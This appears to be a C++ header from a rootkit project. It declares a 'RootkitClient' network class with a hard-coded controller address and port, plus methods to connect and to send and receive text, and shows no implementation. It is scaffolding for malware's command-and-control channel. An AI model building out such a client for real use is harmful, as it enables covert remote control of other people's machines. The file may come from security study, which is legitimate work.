#pragma once
#include "common.h"

namespace Network {
	constexpr unsigned short SERVER_PORT = 9001;
	constexpr unsigned int MAX_PACKET_SIZE = 1024;
	constexpr char SERVER_IP[] = "10.0.0.9";

	class WrapWSA {
	public:
		WrapWSA();
		void cleanup();
		int getError();
	};

	class RootkitClient {
	private:
		WrapWSA wsa_;
		unsigned short port_;
		SOCKET server_socket_;
		bool connect_to_server();
	public:
		RootkitClient();
		~RootkitClient();
		bool SendText(std::string& text);
		bool ReceiveText(std::string& text);
	};

}
